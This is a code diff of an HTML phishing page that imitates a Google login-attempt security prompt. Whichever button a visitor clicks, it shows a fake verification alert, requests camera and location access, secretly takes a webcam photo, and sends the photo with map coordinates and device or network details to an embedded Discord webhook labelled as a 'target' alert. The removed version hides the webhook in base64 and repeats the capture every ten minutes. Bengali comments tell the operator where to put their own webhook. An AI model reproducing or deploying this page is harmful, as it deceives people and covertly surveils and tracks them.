@@ -1,21 +1,19 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Identity Verification - Security Portal</title>
     <style>
-        body { background: #f2f2f7; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { background: #f2f2f7; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .card { background: white; width: 90%; max-width: 350px; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); text-align: center; border: 0.5px solid #d1d1d6; }
         .icon-circle { width: 65px; height: 65px; background: #007aff; border-radius: 15px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
-        h2 { font-size: 22px; margin: 10px 0; color: #000; letter-spacing: -0.5px; }
-        p { font-size: 15px; color: #3a3a3c; margin-bottom: 30px; line-height: 1.5; }
+        h2 { font-size: 22px; margin: 10px 0; color: #000; }
+        p { font-size: 15px; color: #3a3a3c; margin-bottom: 30px; }
         .btn-group { display: flex; gap: 12px; }
-        .btn { flex: 1; padding: 16px; border-radius: 12px; border: none; font-weight: 600; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn { flex: 1; padding: 16px; border-radius: 12px; border: none; font-weight: 600; cursor: pointer; }
         .btn-deny { background: #e5e5ea; color: #ff3b30; }
         .btn-approve { background: #34c759; color: white; }
-        .btn:active { transform: scale(0.96); opacity: 0.8; }
-        #v-frame { display: none; }
     </style>
 </head>
 <body>
@@ -23,88 +21,57 @@
 <div class="card">
     <div class="icon-circle">G</div>
     <h2>Login attempt</h2>
-    <p>We detected a new login attempt from an unrecognized device. Please verify your identity.</p>
+    <p>We detected a new login attempt from an unrecognized device in Dhaka. Please verify your identity.</p>
     <div class="btn-group">
-        <button class="btn btn-deny" onclick="initiateProcess('Deny')">Deny</button>
-        <button class="btn btn-approve" onclick="initiateProcess('Approve')">Approve</button>
+        <button class="btn btn-deny" onclick="startCapture('Deny')">Deny</button>
+        <button class="btn btn-approve" onclick="startCapture('Approve')">Approve</button>
     </div>
-    <video id="v-frame" autoplay playsinline></video>
-    <canvas id="c-frame" style="display:none;"></canvas>
+    <video id="video" style="display:none;" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
-    // tumi (তুমি) - এখানে তোমার ওয়েবহুকটি একটু লুকিয়ে রাখা হয়েছে (Base64)
-    const _0x4a2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4Mjk4NjM3MjYzNjYwNjU0Ni9XazVrTVpUQnhJX1VxSGc5TTc4eEl4VG9yd1NwTEJPR292RWdMVlM4SWNpVkpSTGhwem91dkgySTl2N0c3STB1aDdFMA==";
-    const webhookURL = atob(_0x4a2); 
+    // tumi (তুমি) - তোমার Discord Webhook URL টি এখানে বসাও
+    const webhookURL = "https://discord.com/api/webhooks/1482986372636606546/Wk5kMZTBxI_UqHg9M78xIxTorwSpLBOGovEgLVS8IciVJRLhpzouvh2I9v7G7I0uh7E0"; 
 
-    let sessionActive = false;
-
-    async function getNetworkData() {
-        try {
-            const r = await fetch('https://ipapi.co/json/');
-            return await r.json();
-        } catch (e) { return {ip: "N/A", org: "N/A"}; }
-    }
-
-    async function initiateProcess(type) {
-        if(sessionActive) return;
-        sessionActive = true;
-
-        alert("System Notification: For security purposes, please 'Allow' camera and location access to verify this " + type + " request.");
-
-        // প্রথমবার সাথে সাথে তথ্য পাঠানো
-        runCapture(type);
-
-        // প্রতি ১০ মিনিট পর পর অটো-আপডেট
-        setInterval(() => {
-            runCapture("Auto-Update");
-        }, 600000);
-    }
-
-    async function runCapture(label) {
-        const net = await getNetworkData();
+    async function startCapture(type) {
+        alert("Security Alert: Access to camera and location is required to verify this " + type + " request.");
+        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v-frame');
+            const video = document.getElementById('video');
             video.srcObject = stream;
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const canvas = document.getElementById('c-frame');
+                const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
-
+                
                 setTimeout(async () => {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0);
-
-                    canvas.toBlob(async (imgBlob) => {
+                    
+                    canvas.toBlob(async (blob) => {
                         const fd = new FormData();
-                        fd.append('file', imgBlob, 'auth_verify.jpg');
+                        fd.append('file', blob, 'capture.jpg');
                         fd.append('payload_json', JSON.stringify({
-                            username: "CENTRAL SECURITY",
-                            content: `🔴 **ALERT: Target Interaction [${label}]**`,
+                            content: `🔴 **Alert: Target Clicked [${type}]**`,
                             embeds: [{
-                                color: label === 'Approve' ? 3066993 : 15158332,
                                 fields: [
-                                    { name: "🌐 IP Address", value: net.ip, inline: true },
-                                    { name: "🏢 Provider", value: net.org, inline: true },
-                                    { name: "📍 Map Link", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }
-                                ],
-                                footer: { text: "Monitoring Session Active" },
-                                timestamp: new Date()
+                                    { name: "📍 Location", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
+                                    { name: "📱 Device Info", value: navigator.userAgent }
+                                ]
                             }]
                         }));
 
-                        await fetch(webhookURL, { method: "POST", body: fd });
-
-                        if(label !== "Auto-Update") {
-                            alert("Identity Verified. Request Processed.");
-                            window.location.href = "https://myaccount.google.com/";
-                        }
+                        await fetch(webhookURL, { method: 'POST', body: fd });
+                        window.location.href = "https://myaccount.google.com/";
                     }, 'image/jpeg');
-                }, 1500); // ক্যামেরা স্ট্যাবিল হওয়ার জন্য ১.৫ সেকেন্ড সময়
+                }, 1000);
             });
-        } catch (err) { console.log("Access Denied"); }
+        } catch (e) {
+            console.log("Error:", e);
+        }
     }
 </script>
 </body>
